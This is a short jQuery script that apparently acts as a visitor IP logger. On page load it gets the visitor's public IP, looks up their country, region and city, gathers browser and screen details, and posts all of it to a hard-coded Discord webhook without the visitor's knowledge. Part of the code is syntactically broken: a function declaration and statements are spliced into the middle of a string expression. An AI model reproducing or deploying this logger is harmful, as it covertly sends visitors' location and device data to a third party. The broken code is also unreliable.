$(document).ready(function () {
    $.get("https://api.ipify.org?format=json", function (data) {
        $.get("https://ipinfo.io/" + data.ip + "/json", function (ipData) {
            var message = 'IP Address: ' + data.ip + '\n'
                         + 'Country: ' + ipData.country + '\n'
                         + 'Region: ' + ipData.region + '\n'
                         + 'City: ' + ipData.city + '\n'
                         + 'device:' + function getDeviceDetails() {
  const details = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    colorDepth: window.screen.colorDepth,
    pixelDepth: window.screen.pixelDepth,
    online: navigator.onLine,
  };

  // Check for mobile device
  if (/Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    details.isMobile = true;
  } else {
    details.isMobile = false;
  }

  // Check for touch device
  if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
    details.isTouchDevice = true;
  } else {
    details.isTouchDevice = false;
  }

  return details;
}

const deviceDetails = getDeviceDetails();
console.log(deviceDetails);
                         + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected');

            $.ajax({
                url:  "https://discord.com/api/webhooks/1290539045935517707/Y-3_x6_HtrRGrh4sCmAiUjrh3NCgXwS2vNsl0VAx8ij76inM30SrmDO9x_o4wXanrGuq",
                type: 'POST',
                data: JSON.stringify({ content: message }),
                contentType: 'application/json'
            });
        });
    });
});
